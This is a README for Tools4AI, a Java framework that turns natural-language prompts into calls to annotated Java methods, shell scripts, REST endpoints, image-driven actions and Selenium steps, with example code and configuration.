## Anthropic

If you plan to use Anthropic you will need anthropic api key https://docs.anthropic.com/claude/reference/getting-started-with-the-api


# ✈️ Reference Examples
  
[OpenAI](src/test/java/com/t4a/test/OpenAIActionTest.java)
[Gemini](src/test/java/com/t4a/test/ActionTest.java)  
[Anthropic](src/test/java/com/t4a/test/AnthropicActionTest.java)  
[Gemini1.5Pro](src/test/java/com/t4a/test/AnthropicActionTest.java)  


## Java Actions

Fastest way to create action is by writing a java class  and  annotate its method with ```@Action```
annotation.

**Java Actions:** These are Java classes that have methods with ```@Action``` annotation . They are designed to 
perform specific actions based on prompts processed through Tools4AI.  

**@Predict Annotation:** This is a <u>class level</U> annotation. This annotation is used to add the action to the prediciton list, doing this will make sure
the action is called automatically when the prompt is processed and if the prompt matches with the action (action name or method name). All the methods 
in this class annotated with @Action will be added to the prediction list.

**@Action Annotation:** This is a <u>method level</u> annotation. The action method within the Java class is annotated with @Action to specify the action's behaviour
this is the actual method which will be triggered if the prompt matches by AI. You can have as many methods as you want with @Action
annotation in the class.

**Method Execution:** When a prompt like ""My friend's name is Vishal, I don’t know what to cook for him today."" 
is processed, the ```whatFoodDoesThisPersonLike``` method is automatically called with ""Vishal"" as the argument, 
and it returns ""Paneer Butter Masala"" as Vishal's preference. 
``` 
@Predict
public class SimpleAction  {

    @Action( description = ""what is the food preference of this person"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
This class can contain any number of methods both public or private. All the methods with ```@Action``` annotation  
in this class are going be added to the prediction list. In this case it is just ```whatFoodDoesThisPersonLike```.

This method can contain any number of parameters (Objects, Pojos, Arrays etc) and can be of have any return value, everythign will 
be mapped at runtime using prompt. ```@Action``` annotation also takes additional values for ActionRisk and Description.

When you send a prompt to  action processor (OpenAIActionProcessor, GeminiActionProcessor or AnthoripicActionProcessor)
``` 
 String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String functionResponse = (String)tra.processSingleAction(cookPromptSingleText);
 //functionResponse will be Paneer Butter Masala
 String aiResponse = tra.query(cookPromptSingleText,functionResponse);
 //aiResponse will be well forumulated response something like ""Hey looks like your friend likes Panner Butter Masala
```

The above action will be called with ``` name = Vishal``` automatically based on the action name and prompt type.
AI will figure out that this is the correct action to call. You can also add grouping information in Predict annotation to 
make it even more targeted. You don't have to specify the Action explicitly if its not a High Risk action

**Convert prompt to Pojo**

You can convert any Prompt into a Java Pojo object. Your pojo can be simple or complex , it can have arrays, list
maps and other pojos and they all will be mapped based on the prompt

```
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptText = ""Mhahrukh Khan works for MovieHits inc and his salary is $ 100  he joined Toronto on 
Labor day, his tasks are acting and dancing. He also works out of Montreal and Bombay. Krithik roshan is 
another employee of same company based in Chennai his taks are jumping and Gym he joined on Indian Independce
 Day"";
Organization org = (Organization) tra.transformIntoPojo(promptText, Organization.class.getName(),"""","""");
Assertions.assertTrue(org.getEm().get(0).getName().contains(""Mhahrukh""));
Assertions.assertTrue(org.getEm().get(1).getName().contains(""Krithik""));
```
The above code will map the prompt and convert into [Organization](src/test/java/com/t4a/examples/pojo/Organization.java) Pojo object 

**Trigger Action**

Trigger action based on prompt, in case its MyDiary action [MyDiaryAction](src/test/java/com/t4a/examples/actions/MyDiaryAction.java)

```
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""I have dentist appointment on 3rd July, then i have Gym appointment on 7th August 
 and I am meeting famous Bollywood actor Shahrukh Khan on 19 Sep. My friends Rahul, Dhawal, Aravind are 
 coming with me. My employee Jhonny Napper is comign with me he joined on Indian Independce day.
 My customer name is Sumitabh Bacchan he wants to learn acting form me he joined on labor day"";
 MyDiaryAction action = new MyDiaryAction();
 MyDiary dict = (MyDiary) tra.processSingleAction(promptText,action);
 log.info(dict.toString()); 
```

If you do not specify any action then it will be predicted based on prompt and groups for example

```
MyDiary dict = (MyDiary) tra.processSingleAction(promptText)
```
As you can notice we are not passing any action with the prompt the AI will figure out the action correctly

A simple Java action can be written like this 

```
@Predict(groupName = ""buildMyDiary"" , groupDescription = ""This is my diary details"")
public class MyDiaryAction implements JavaMethodAction {
    @Action  
    public MyDiary buildMyDiary(MyDiary diary) {
        //take whatever action you want to take
        return diary;
    }
} 
```
Here the actionName is ```buildMyDiary```, MyDiary pojo will be created automatically based on prompt

**Action groups**

```
@Predict(groupName = ""personal"", groupDescription = ""all personal actions are here"") 
```
Actions have to be annontated with @Predict to be added to prediction list , they can be grouped together with
the groupName.

**Custom Pojo**

There are different annontations which be used for special Pojo mapping

**Mapping list**

```
    @ListType(Employee.class)
    List<Employee> em;
    @ListType(String.class)
    List<String> locations; 
```

**Mapping Maps in objects**
``` 
@Predict(actionName = ""addSports"",description = ""add new Sports into the map"")
public class MapAction implements JavaMethodAction {

    public Map<Integer,String> addSports(@MapKeyType(Integer.class)  @MapValueType(String.class) Map<Integer,String> mapOfSportsName) {

        return mapOfSportsName;
    }
}

```

**Special Instructions**

``` 
@Prompt(describe = ""convert this to Hindi"")
private String reasonForCalling;
```

The above instruction will fetch the reason for calling from the user prompt and convert it into Hindi and put
it inside the ```reasonForCalling``` String

**Ignore Field**
```
    @Prompt(ignore = true)
    private String location;
```
If you do not want to populate a field you can annotate it as ignore

**Format Date**

```
    @Prompt(dateFormat = ""yyyy-MM-dd"" ,describe = ""if you dont find date provide todays date in fieldValue"")
    private Date dateJoined;
```
The above will fetch the dateJoined from the prompt and convert it into the format. So if your prompt is
""Book my dinner reservation on Indian Independence day"" , the dateJoined will be 2024-08-15

**Muliple Special Prompts**
```
 public class MyTranslatePojo {
    @Prompt(describe = ""translate to Hindi"")
    String answerInHindi;
    @Prompt(describe = ""translate to Punjabi"")
    String answerInPunJabi;

    @Prompt(describe = ""translate to Tamil"")
    String answerInTamil;
}
```
The above Pojo can be used to translate the prompt in multiple language and populate the result in variables

``` 
OpenAIPromptTransformer tra = new OpenAIPromptTransformer();
String promptTxt = ""paneer is so good"";
MyTranslatePojo myp = (MyTranslatePojo)tra.transformIntoPojo(promptTxt,MyTranslatePojo.class.getName());
System.out.println(myp);
```

Result will look something like this 

``` MyTranslatePojo(answerInHindi=पनीर इतना अच्छा है, answerInPunJabi=ਪਨੀਰ ਬਹੁਤ ਵਧੀਆ ਹੈ, answerInTamil=பனீர் எப்படி நல்லது) ```

**High Risk Actions**  
There might be some actions which you do not want to be triggered automatically but passed explicitly in the processor
such actions can be annotated with HighRisk

```
@Predict(actionName = ""restartTheECOMServer"",description = ""will be used to restart the server"" , 
riskLevel = ActionRisk.HIGH, groupName = ""customer support"", 
groupDescription = ""actions related to customer support"")
public class ServerRestartAction implements JavaMethodAction {
    public String restartTheECOMServer(String reasonForRestart, String requestedBy) {
        return "" Server has been restarted by ""+requestedBy+"" due to following reason ""+reasonForRestart;
    }
}

```
The above action is marked as High Risk action so if you try to call it with simple prompt

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
String functionResponse = (String)processor.processSingleAction(""restartPrompt"");

```
It will not be triggered even though the AI will correct identify which action to trigger still it will get blocked.

You will have to call it explicitly this way

``` 
OpenAiActionProcessor processor = new OpenAiActionProcessor()
String restartPrompt = ""Hey I am Vishal , restart the server as its very slow "";
ServerRestartAction restartAction = new ServerRestartAction();
String functionResponse = (String)processor.processSingleAction(""restartPrompt"", restartAction);
```


## HTTP Actions (Swagger)

Any application exposing HTTP REST API can be converted into actions for example here is my sample [swagger_actions.json.](https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub/blob/main/swagger_actions.json)
All the REST calls such as get, post, put, delete will be mapped to actions and based on the prompts they can be triggered
automatically

``` 
{
  ""endpoints"" : [
    {
      ""swaggerurl"": ""https://fakerestapi.azurewebsites.net/swagger/v1/swagger.json"",
      ""group"": ""Books Author Activity"",
      ""description"": ""This is for all the actions related books , Authors, photos and users trying to read books and view photos"",
      ""baseurl"": ""https://fakerestapi.azurewebsites.net/"",
      ""id"": ""fakerestapi""
    },
    {
      ""swaggerurl"": ""https://petstore3.swagger.io/api/v3/openapi.json"",
      ""baseurl"": ""https://petstore3.swagger.io/"",
      ""group"": ""Petstore API"",
      ""description"": ""This is for all the actions related to pets"",
      ""id"": ""petstore""
    } ,
    {
      ""swaggerurl"": ""https://vishalmysore-instaservice.hf.space/v3/api-docs"",
      ""baseurl"": ""https://vishalmysore-instaservice.hf.space/"",
      ""group"": ""Enterprise Support and Tickeing System"",
      ""description"": ""This action is to create tickets track bugs across the enterprise"",
      ""id"": ""InstaService""
    }      
  ]
}
```

Books related api are put in a group called Books Author Activity group, similarly Petstore API is group for all the rest calls exposed by Petstore app 
if you provide a prompt ""create a ticket for me with number 1 and issue is compture not working"" 
it will automatically create a ticket on InstaService you can view the logs here https://huggingface.co/spaces/VishalMysore/InstaService?logs=container

```
@Test
public void testHttpActionOpenAI() throws AIProcessingException, IOException {
  OpenAiActionProcessor processor = new OpenAiActionProcessor();
  String postABook = ""post a book harry poster with id 189 the publish date is 2024-03-22 and the description 
  is about harry who likes poster its around 500 pages  "";
  String result = (String)processor.processSingleAction(postABook);
  Assertions.assertNotNull(result);
  String success = TestHelperOpenAI.getInstance().sendMessage(""Look at this message - ""+result+"" -
   was it a success? - Reply in true or false only"");
  log.debug(success);
  Assertions.assertTrue(""True"".equalsIgnoreCase(success));

} 
```
This will automatically trigger HTTP post call with correct parameters 

Read the complete link on how this has been deployed [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc/?trackingId=iZoQDW3%2BTH6j0%2FkbEMUxFw%3D%3D)


## Shell Actions 

Any kind of script can be coverted into Action for function calling by configuring the script in [shell_actions.yml](src/test/resources/shell_actions.yaml)
```
groups:
  - name: Employee Actions
    description : This is actions for all the new employees
    scripts:
      - scriptName: ""test_script.cmd""
        actionName: saveEmployeeInformation
        parameters: employeeName,employeeLocation
        description: This is a command which will save employee information
		
```

Here we are creating a group called Employee Actions and adding an action called ``` saveEmployeeInformation``` into the group. The parameters it takes are ```employeeName ``` and ```employeeLocation ```
Calling and actionprocessor with these kinds of prompt will trigger this Action
``` 
 OpenAiActionProcessor tra = new OpenAiActionProcessor();
 String promptText = ""A new employee joined today in Toronto. Her name is Madhuri Khanna""; 
 tra.processSingleAction(promptText);
 
```
		
As You can notice we are not passing the action explicitly , it will be predicted by the AI at runtime and triggered.


## Custom HTTP Actions

If you do not have swagger URL and would like to configure HTTP rest end points it can be done via Custom HTTP Actions by configuring them in [http_actions.json](src/test/resources/http_actions.json)


``` 
{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
    {
      ""actionName"": ""somethingNotVeryUseful"",
      ""url"": ""https://api.example.com/temperature"",
      ""description"" : "" this will get real time temperature from the weather api"",
      ""type"": ""GET"",
      ""input_object"":[
        {
          ""name"": ""locationId"",
          ""type"": ""query_parameter"",
          ""description"": ""Location ID""
      }
      ],
      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""Real-time temperature data""
      },
      ""auth_interface"": {
        ""type"": ""API Key"",
        ""description"": ""API key required""
      }
    }
  ]
}

```
## Image Actions
Tools4AI uses Gemini (gemini-1.0-pro-vision) to enhance AI capabilities by enabling the system to analyze images
and automatically execute relevant actions based on the visual data it processes. This development is 
particularly crucial in emergency management, where speed and accuracy of response can save lives and property.

Reference code is [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java)

Detailed article on the same is avaiable [here](https://medium.com/@visrow/image-recognition-and-function-calling-with-gemini-and-java-e28b0356d3de)
```  
package org.example.image;

import com.t4a.processor.AIProcessingException;
import com.t4a.processor.GeminiImageActionProcessor;
import com.t4a.processor.GeminiV2ActionProcessor;

public class ImageActionExample {
    public static void main(String[] args) throws AIProcessingException {
        GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
        String imageDisription = processor.imageToText(args[0]);
        GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
        Object obj = actionProcessor.processSingleAction(imageDisription);
        String str  = actionProcessor.summarize(imageDisription+obj.toString());
        System.out.println(str);
    }
}
```
 <img src=""accident.png""  width=""300"" height=""300"">

If you execute the [ImageActionExample](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/ImageActionExample.java) 
with above image as source it correctly identifies that we need to call Ambulance 

``` 
The image depicts a car accident involving a blue car and a red car on a city street. The blue car has front-end damage while the red car has rear-end damage. Debris from the accident is scattered on the street and a 
police officer is present at the scene. An ambulance has been called and is seen in the background.
```

Direct Action from Visual Cues: Whether it's a surveillance image of a car accident or a live feed of a residential fire, Tools4AI can immediately recognize critical situations and initiate appropriate emergency protocols without human input.
A sample action is written and the code is available [here](https://github.com/vishalmysore/sam/blob/main/src/main/java/org/example/image/action/EmergencyAction.java)
``` 
@Predict(actionName = ""callEmergencyServices"", description = ""This action will be called in case of emergency"", groupName = ""emergency"")
public class EmergencyAction implements JavaMethodAction {
    public String callEmergencyServices(@Prompt(describe = ""Ambulance, Fire or Police"") String typeOfEmergency) {
        return typeOfEmergency+"" has been called"";
    }
} 
```
## Automated UI Validations

Images can also be converted into Json and Pojos for UI based validations. You can use selenium with Tools4AI 
to validated your UI instead of using elements from the web page , more details [here](https://medium.com/@visrow/selenium-and-ai-ui-validations-with-ai-1799ab2f305e)  

 <img src=""auto.PNG""  width=""300"" height=""300"">

The above image can be converted into a Pojo object with help of Tools4AI

```  
WebDriverManager.chromedriver().setup();

ChromeOptions options = new ChromeOptions();
options.addArguments(""--headless"");  // Setting headless mode
ptions.addArguments(""--disable-gpu"");  // GPU hardware acceleration isn't useful in headless mode
options.addArguments(""--window-size=1920,1080"");  // Set the window size
WebDriver driver = new ChromeDriver(options);

driver.get(""https://google.com"");
// Your code to interact with the page and take screenshots
// Take screenshot and save it as file or use as bytes
TakesScreenshot ts = (TakesScreenshot) driver;
byte[] screenshotBytes = ts.getScreenshotAs(OutputType.BYTES);
GeminiImageActionProcessor imageActionProcessor = new GeminiImageActionProcessor();
imageActionProcessor.imageToText(screenshotBytes)
//File srcFile = ts.getScreenshotAs(OutputType.FILE);
//File destFile = new File(""screenshot.png"");
//FileHandler.copy(srcFile, destFile);
driver.quit();
```

The pojo it will convert to is 

``` 
import lombok.*;
@Getter
@Setter
@ToString
@NoArgsConstructor
@AllArgsConstructor
public class AutoRepairScreen {
    double fullInspectionValue;
    double tireRotationValue;
    double oilChangeValue;
    Integer phoneNumber;
    String email;
    String[] customerReviews;
}
```

Integrating Tools4AI with Selenium offers a revolutionary approach to UI validation, streamlining the testing 
process by validating UI elements in their entirety. Rather than the traditional method of scrutinizing each 
element individually, this integration enables comprehensive, automated verification of tags and elements.
It simplifies the UI Validation workflow, ensuring accuracy and efficiency in confirming the UI's adherence to design specifications  

## Selenium integration
Tools4AI's integration with Selenium introduces a flexible way to automate UI testing. Instead of traditional
Java code for Selenium scripts, Tools4AI allows you to define test scenarios in plain English, offering a more 
accessible approach to testing web applications. These English-based commands can be converted into Selenium 
code to automate web-based interactions and streamline testing.  

**Example of Selenium Test with Tools4AI**
``` 
 WebDriver driver = new ChromeDriver(options);
 SeleniumProcessor processor = new SeleniumProcessor(driver);
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean buttonPresent =  processor.trueFalseQuery(""do you see Add/Remove Elements?"");
 if(buttonPresent) {
    processor.processWebAction(""click on Add/Remove Elements"");
    // perform other function in simple english
 } //else {
   // processor.processSingleAction(""Create Jira by taking screenshot"");
  // }
 processor.processWebAction(""go to website https://the-internet.herokuapp.com"");
 boolean isCheckboxPresent =  processor.trueFalseQuery(""do you see Checkboxes?"");
 if(isCheckboxPresent) {
   processor.processWebAction(""click on Checkboxes"");
   processor.processWebAction(""select checkbox 1"");
 }
```
In this example, the ```SeleniumProcessor``` processes commands in plain English and converts them into Selenium 
actions. This approach allows for complex interactions without manually writing Java code for each test. 
Tools4AI serves as a bridge between natural language and Selenium, making it easier to automate UI testing in
a way that is both efficient and intuitive.  

This integration offers substantial benefits for teams looking to streamline their UI validation process.
By enabling a more straightforward way to define and execute Selenium scripts, Tools4AI provides a flexible
framework for automating Selenium-based tests.  

## Spring integration

All the action processors have Spring integration as well 

``` 
SpringAnthropicProcessor springAnthropic = new SpringAnthropicProcessor(applicationContext)
```
``` 
SpringGeminiProcessor springGemini = new SpringGeminiProcessor();
```

```  
SpringOpenAIProcessor springOpenAI = new SpringOpenAIProcessor();
```

You can use this for spring injection and it works exactly as all other action processors , only difference is
that instead of creating new action beans it will reuse the beans already created by spring


look at the example here https://github.com/vishalmysore/SpringActions



## 📘 JavaDocs

Look at the java docs here - https://javadoc.io/doc/io.github.vishalmysore/tools4ai/latest/index.html


## 🧱 Prediction Loaders

### 🔑 Java Prediction Loaders

All the classes implementing ```JavaMethodAction``` interfaces and having annotation ```@Predict``` are added to prediction list
```JavaMethodAction``` is integral to creating all AI-related actions, with each action implemented as a function adhering to the principles of functional programming. The function's name should be descriptive, aligning closely with the action it performs
```@Predict``` Annotation: This annotation ensures that the AIAction object is included in our prediction list. While not mandatory, it's advisable to mark all actions with @Predict for automatic execution. However, for highly customized actions like deleting records or canceling reservations, omitting this annotation might be preferable to prevent automatic execution.

```actionName``` the descriptive name of the primary function within the class. It's crucial to name this function accurately, as AI utilizes semantic mapping at runtime to correlate the function.

```
@Predict(actionName = ""whatFoodDoesThisPersonLike"", description = ""what is the food preference of this person "")
public class SimpleAction implements JavaMethodAction {

    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
            return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}

```

So prompt like ```Hey Vishal is coming to my house for dinner``` will automatically trigger method ```whatFoodDoesThisPersonLike``` with ```name``` Vishal

### 🖌️ Shell Prediction Loader  

The prediction loader is responsible for loading command scripts, shell scripts, Python scripts, or any other
type of script from configuration files. It utilizes the actionName field from the configuration to map to 
prompts in real-time. Here's an example configuration entry: 

```
- scriptName: ""test_script.cmd""
  actionName: saveEmployeeInformation
  parameters: employeeName,employeeLocation
  description: This is a command which will save employee information
 ```
During runtime, the prediction loader dynamically extracts parameters from the prompt. Subsequently, it invokes 
the corresponding script based on the action name. Upon execution, the script processes the parameters and 
generates a result, which is then sent back to the AI system.  Finally, the AI system formulates a response based on the received result and provides feedback accordingly.
User: ""Hey, Bahubali joined the IFC and we are so happy.""

In this prompt:

""Hey"" serves as a casual greeting.
""Bahubali"" represents the name of the new joiner, which needs to be extracted as a parameter.
""joined the IFC"" implies an action, where the specifics of the action need to be determined. ""IFC"" is the name of the organization.
""we are so happy"" provides additional context but doesn't directly affect the action to be taken.
The AI system first matches the user's intent with a list of all available actions. In this case, it selects the ""saveEmployeeInformation"" action as the best match. Then, it maps the parameters accordingly: ""Bahubali"" as the employee's name and ""IFC"" as the organization's name. This allows the AI system to accurately understand and execute the user's request.

### ✒️ Swagger Prediction Loader  
<img src=""restapi.png"" >

The Swagger Prediction Loader is capable of directly loading HTTP endpoints as predictions, enabling automatic
execution of commands that semantically match the endpoints with extracted parameters. The screenshot provided
is from https://fakerestapi.azurewebsites.net/index.html, included as an example. Each endpoint within this 
API is converted to an ```HttpPredictedAction``` and dynamically added to the prediction list in real-time by the 
```SwaggerPredictionLoader.``` 

This seamless integration allows for streamlined execution of commands based on the available HTTP endpoints.
**Parsing Swagger/OpenAPI Specification:** The Swagger Prediction Loader reads the Swagger/OpenAPI specification file, which describes the available endpoints, their methods (e.g., GET, POST), parameters, and other details.

**Endpoint Extraction:** The loader extracts each endpoint from the specification, along with its associated metadata such as method, path, parameters, etc.

**Action Mapping:** For each endpoint, the loader creates an HttpPredictedAction object. This action represents the corresponding HTTP operation (e.g., GET, POST) that clients can perform on the endpoint.

**Parameter Extraction:** The loader extracts parameters defined for each endpoint, such as query parameters, path parameters, headers, etc.

**Action Configuration:** The extracted parameters are configured within the HttpPredictedAction object, allowing for dynamic parameterization during execution. Parameters may be mapped to placeholders within the endpoint URL or included in the request body, headers, etc., as specified by the endpoint definition.

**Addition to Prediction List:** Finally, the HttpPredictedAction objects are added to the prediction list, making them available for automatic execution based on user prompts. Users can invoke actions by providing prompts that match the semantic intent of the mapped endpoints, and the system will execute the corresponding HTTP operation with the extracted parameters.

In essence, the Swagger Prediction Loader leverages the structure and metadata defined in the Swagger/OpenAPI
specification to dynamically create HttpPredictedAction objects, allowing for seamless integration of HTTP
endpoints into the prediction system

### ✍️ Http Prediction Loader

```HttpPredictionLoader``` is responsible for loading the manual http endpoint configuration which look something like this 

```{
  ""endpoints"": [
    {
      ""actionName"": ""getUserDetails"",
      ""description"" : "" this will fetch User details from the user inventory corporate application"",
      ""url"": ""https://api.example.com/users/"",
      ""type"": ""GET"",
      ""input_object"": [
      {
        ""name"": ""userId"",
        ""type"": ""path_parameter"",
        ""description"": ""User ID""
      }
      ],

      ""output_object"": {
        ""type"": ""json"",
        ""description"": ""User object""
      },
      ""auth_interface"": {
        ""type"": ""Bearer Token"",
        ""description"": ""Authentication token required""
      }
    },
```
For the manual definition of HTTP endpoints using a configuration file like the one provided, the process involves specifying each endpoint along with its associated details such as action name, description, URL, HTTP method (type), input parameters, output object, and authentication interface. Here's how the mapping process occurs:

**Configuration File Parsing:** The application parses the configuration file to extract each endpoint definition along with its metadata.

**Endpoint Mapping:** For each endpoint defined in the configuration file, an HttpPredictedAction object is created to represent the corresponding HTTP operation.

**Action Configuration:** The metadata provided in the configuration file is used to configure the HttpPredictedAction object:

**Action Name:** Specifies the name of the action, which serves as a unique identifier.  
**Description:** Provides a brief description of what the action does or its purpose.  
**URL:** Defines the endpoint URL to which the HTTP request will be sent.  
**HTTP Method (Type):** Specifies the HTTP method (e.g., GET, POST) to be used for the request.  
**Input Parameters:** Describes the input parameters required for the HTTP request, such as path parameters, query parameters, etc.  
**Output Object:** Defines the format and structure of the response expected from the endpoint.  
**Authentication Interface:** Specifies the authentication mechanism required to access the endpoint, along with any necessary credentials.  
**Parameter Extraction:** The input parameters defined for each endpoint are extracted and configured within the HttpPredictedAction object.  

**Addition to Prediction List:** Finally, the HttpPredictedAction objects representing the manually defined endpoints are added to the prediction list, making them available for automatic execution based on user prompts.

This approach allows for flexibility in defining HTTP endpoints outside of a Swagger/OpenAPI specification, enabling the manual configuration of endpoints to suit specific application requirements.

### 🖊️ Extended Prediction Loader
The ```ExtendedPredictionLoader``` offers a mechanism for creating custom prediction loaders. While Shell, HTTP, and Java Methods are supported by default, there may arise situations or use cases necessitating a custom set of actions. It's important to note the distinction between custom actions and ```ExtendedPredictedAction.``` Custom actions can be created by implementing the AIAction class, while ExtendedPredictedAction have their own loading mechanism. These actions are already present in the prediction list by default and cannot be predicted again.

To create custom implementations of ExtendedPredictionLoader, you need to annotate the loader class with ```@ActivateLoader.``` Prediction loader will then identify all classes with this annotation and call the ```getExtendedActions()``` method. This method should return the action names along with their corresponding ExtendedPredictOptions, allowing for the seamless integration of custom actions into the prediction system.

## Autonomous Agent 

### Action Script
If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

## Response Validation

### Hallucination

```ZeroShotHallucinationDetector``` is designed to assess the consistency of responses generated by a Large Language Model (LLM) and detect potential hallucinations. It operates by breaking down an original question into multiple granular questions, each probing different aspects or variations of the inquiry. These granular questions are then presented to the LLM separately, generating responses that are subsequently compared to the original question within its original context.

During comparison, factors such as semantic coherence, relevance, and contextual alignment are evaluated to quantify the consistency between each response and the original question. This evaluation results in a percentage score for each response, representing its level of conformity with the original query.

Finally, these individual percentage scores are aggregated to calculate a cumulative percentage. If the cumulative percentage surpasses a predefined threshold, it indicates a discrepancy or potential hallucination.

By systematically analyzing responses in this manner, the class provides a robust mechanism for assessing the reliability and coherence of LLM-generated content.

This method employs a Zero Shot approach to detect hallucination, utilizing a straightforward methodology devoid of external sources. It operates as follows:

Input: The method takes in responses generated by the Large Language Model (LLM) without relying on any additional data sources.

Granular Analysis: It breaks down the original question into multiple granular inquiries, covering diverse aspects or variations of the initial query.

Zero Shot Evaluation: Without external references, the method evaluates each response against the original question, assessing factors such as semantic coherence and contextual relevance.

Consistency Assessment: Based on the comparison, the method quantifies the consistency of each response, assigning a score indicative of its conformity with the original query.

Cumulative Evaluation: These individual scores are then aggregated to derive a cumulative assessment, providing insight into the overall coherence of the LLM-generated responses.

By employing a simple yet effective Zero Shot technique, this method offers a streamlined approach to detect potential hallucinations in LLM-generated content, contributing to the reliability and trustworthiness of AI-generated outputs.

### Bias
### Fairness



## Advanced Reference Examples

This will do a google search and return the result can be combined with multiaction  
```
ActionProcessor processor = new ActionProcessor();
String news = (String)processor.processSingleAction(""can you search the web for Indian news"");

```
Guard Rails with Spring security 
``` Security - Guard Rails using Spring Security``` TBD <br>
``` Application Checkout and monitoring using with Gemini - Prompt - Check if my restaurant system is up and running and able to book the reservation``` TBD <br>
``` Validation with Prompt  - Prompt - What happened the the flight booking i made whats the status?```TBD <br>

## 🧾 Advanced prompt function calling
``` Can you check if my movie booking system can handle 50 reservations in 1 min ``` <br>
``` what happens if my cookgpt is giving only vegetarian recipes``` <br>",0,0,11,mit,15.0,"['table', 'content', 'rapid', 'start', 'setup', 'gemini', 'openai', 'anthropic', 'reference', 'example', 'java', 'action', 'http', 'rest', 'action', 'shell', 'action', 'custom', 'http', 'action', 'selenium', 'integration', 'image', 'action', 'automated', 'ui', 'validation', 'spring', 'integration', 'javadocs', 'prediction', 'loader', 'java', 'prediction', 'loader', 'swagger', 'prediction', 'loader', 'shell', 'prediction', 'loader', 'extended', 'prediction', 'loader', 'response', 'validation', 'hallucination', 'autonomous', 'agent', 'action', 'script', 'rapid', 'start', 'want', 'start', 'building', 'asap', 'look', 'rapid', 'start', 'http', 'integration', 'spring', 'controller', 'ai', 'action', 'http', 'live', 'demo', 'http', 'java', 'based', 'agentic', 'framework', 'used', 'build', 'java', 'based', 'ai', 'agent', 'integration', 'enterprise', 'java', 'application', 'project', 'illustrates', 'integration', 'ai', 'enterprise', 'tool', 'external', 'tool', 'converting', 'natural', 'language', 'prompt', 'actiona', 'ble', 'behavior', 'prompt', 'called', 'action', 'prompt', 'actionable', 'prompt', 'leveraging', 'ai', 'capability', 'streamlines', 'user', 'interaction', 'complex', 'system', 'enhancing', 'productivity', 'innovation', 'across', 'diverse', 'application', 'example', 'integrate', 'ai', 'customer', 'service', 'application', 'user', 'interact', 'ai', 'system', 'asking', 'question', 'making', 'request', 'natural', 'language', 'example', 'user', 'might', 'ask', 'schedule', 'maintenance', 'appointment', 'car', 'ai', 'system', 'interprets', 'request', 'extract', 'relevant', 'information', 'service', 'required', 'preferred', 'date', 'trigger', 'appropriate', 'action', 'customer', 'service', 'application', 'schedule', 'appointment', 'seamless', 'integration', 'streamlines', 'process', 'user', 'enhances', 'efficiency', 'customer', 'service', 'workflow', 'prompt', 'action', 'create', 'new', 'task', 'marketing', 'campaign', 'ai', 'system', 'interprets', 'request', 'generates', 'new', 'task', 'entry', 'within', 'project', 'management', 'tool', 'dedicated', 'marketing', 'campaign', 'assigning', 'relevant', 'detail', 'priority', 'level', 'due', 'date', 'task', 'description', 'generate', 'sale', 'report', 'previous', 'quarter', 'ai', 'system', 'access', 'data', 'company', 'sale', 'database', 'analyzes', 'information', 'previous', 'quarter', 'generates', 'comprehensive', 'sale', 'report', 'delivered', 'user', 'stored', 'appropriate', 'location', 'access', 'check', 'inventory', 'status', 'product', 'x', 'ai', 'system', 'retrieves', 'inventory', 'data', 'product', 'x', 'inventory', 'management', 'system', 'provides', 'user', 'information', 'regarding', 'current', 'stock', 'level', 'including', 'quantity', 'available', 'location', 'pending', 'order', 'schedule', 'video', 'conference', 'engineering', 'team', 'next', 'monday', 'ai', 'system', 'interface', 'calendar', 'scheduling', 'tool', 'creates', 'new', 'event', 'titled', 'engineering', 'team', 'video', 'conference', 'specified', 'date', 'time', 'sends', 'meeting', 'invitation', 'member', 'engineering', 'team', 'submit', 'reimbursement', 'request', 'business', 'trip', 'expense', 'ai', 'system', 'guide', 'user', 'reimbursement', 'request', 'process', 'collecting', 'necessary', 'detail', 'expense', 'receipt', 'date', 'amount', 'purpose', 'expenditure', 'compiled', 'system', 'submits', 'reimbursement', 'request', 'appropriate', 'department', 'processing', 'prompt', 'prediction', 'technique', 'used', 'anticipate', 'user', 'action', 'based', 'input', 'prompt', 'instance', 'user', 'prompt', 'car', 'broke', 'addition', 'action', 'booktaxi', 'ai', 'system', 'predict', 'set', 'subsequent', 'action', 'bookcarservice', 'orderfood', 